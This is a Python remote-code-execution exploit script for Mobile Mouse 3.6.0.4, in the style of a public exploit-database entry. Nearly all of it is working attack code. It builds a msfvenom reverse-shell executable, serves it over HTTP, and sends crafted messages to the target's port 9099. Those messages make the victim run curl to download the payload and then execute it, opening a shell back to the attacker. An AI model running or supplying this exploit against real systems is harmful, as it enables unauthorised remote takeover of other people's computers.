#!/usr/bin/env python3
"""
# Exploit Title: Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)
# Date: Aug 09, 2022
# Exploit Author: Chokri Hammedi
# Fixed and updated by: lof1
# Further update by: x7331 (May 2025)
# Vendor Homepage: https://mobilemouse.com/
# Software Link: https://www.mobilemouse.com/downloads/setup.exe
# Version: 3.6.0.4
# Tested on: Windows 10 Enterprise LTSC Build 17763

# Instructions:
# 1) Generate your payload exe (optional):
#    msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<Your IP> LPORT=<Your Port> -f exe -o <payload_name>.exe
# 2) Or let this script generate one automatically.
# 3) Run this script with proper arguments.
"""

import socket
import argparse
import threading
import http.server
import socketserver
import subprocess
import tempfile
import os
from time import sleep

help = "Mobile Mouse 3.6.0.4 Remote Code Execution (RCE) by Chokri Hammedi, updated by x7331"

parser = argparse.ArgumentParser(description=help)
parser.add_argument("--target", help="Target IP", required=True)
parser.add_argument("--lhost", help="Your local IP (for reverse shell)", default="127.0.0.1")
parser.add_argument("--lport", type=int, help="Your listening port (reverse shell)", default=443)
parser.add_argument("--server-port", type=int, help="HTTP server port to serve payload", default=8080)
parser.add_argument("--payload", help="Path to custom payload executable (optional)")
args = parser.parse_args()

host = args.target
lhost = args.lhost
lport = args.lport
server_port = args.server_port
payload_path = args.payload

def generate_payload():
    print(f"[+] Generating payload for {lhost}:{lport}...")
    temp_payload = tempfile.NamedTemporaryFile(delete=False, suffix=".exe")
    temp_payload.close()  # Close file so msfvenom can write to it

    cmd = [
        "msfvenom",
        "-p", "windows/shell_reverse_tcp",
        "-a", "x86",
        "--platform", "windows",
        "-f", "exe",
        "-o", temp_payload.name,
        "LHOST=" + lhost,
        "LPORT=" + str(lport),
        "-e", "x86/shikata_ga_nai"
    ]

    try:
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Payload generated at {temp_payload.name}")
        return temp_payload.name
    except Exception as e:
        print("[!] Failed to generate payload:", e)
        if os.path.exists(temp_payload.name):
            os.unlink(temp_payload.name)
        return None

class PayloadRequestHandler(http.server.SimpleHTTPRequestHandler):
    payload_dir = None  # class variable to store directory

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=self.payload_dir, **kwargs)

    def log_message(self, format, *args):
        # Silence the HTTP server logging
        return

def run_http_server(payload_dir):
    PayloadRequestHandler.payload_dir = payload_dir
    with socketserver.TCPServer(("", server_port), PayloadRequestHandler) as httpd:
        print(f"[+] Serving payload on http://0.0.0.0:{server_port}/{os.path.basename(payload_file)}")
        httpd.serve_forever()

if __name__ == "__main__":
    if payload_path:
        if not os.path.isfile(payload_path):
            print(f"[!] Payload file {payload_path} does not exist.")
            exit(1)
        payload_file = payload_path
    else:
        payload_file = generate_payload()
        if not payload_file:
            print("[!] Payload generation failed, exiting.")
            exit(1)

    # Start HTTP server in a background thread
    server_thread = threading.Thread(target=run_http_server, args=(os.path.dirname(payload_file),), daemon=True)
    server_thread.start()

    port = 9099  # Mobile Mouse default port

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        CONN = bytearray.fromhex("434F4E4E4543541E1E63686F6B726968616D6D6564691E6950686F6E651E321E321E04")
        s.send(CONN)
        run = s.recv(54)

        RUN = bytearray.fromhex("4b45591e3131341e721e4f505404")
        s.send(RUN)
        run = s.recv(54)

        sleep(1)

        download_string = f"curl http://{lhost}:{server_port}/{os.path.basename(payload_file)} -o c:\\Windows\\Temp\\{os.path.basename(payload_file)}".encode('utf-8')
        hex_shell = download_string.hex()
        SHELL = bytearray.fromhex("4B45591E3130301E" + hex_shell + "1E04" + "4b45591e2d311e454e5445521e04")
        s.send(SHELL)
        shell = s.recv(96)

        print("[+] Executing the payload...")

        sleep(10)
        s.close()

        # Connect again to trigger execution
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        s.send(CONN)
        run = s.recv(54)

        s.send(RUN)
        run = s.recv(54)

        sleep(1)

        run_payload = f"c:\\Windows\\Temp\\{os.path.basename(payload_file)}".encode('utf-8')
        hex_shell = run_payload.hex()
        SHELL = bytearray.fromhex("4B45591E3130301E" + hex_shell + "1E04" + "4b45591e2d311e454e5445521e04")
        s.send(SHELL)
        shell = s.recv(96)

        sleep(10)
        print("[+] Payload triggered! Check your listener.")
        s.close()

    finally:
        # Cleanup generated payload file if any
        if not payload_path and payload_file and os.path.exists(payload_file):
            os.unlink(payload_file)
            print(f"[+] Temporary payload file {payload_file} deleted.")
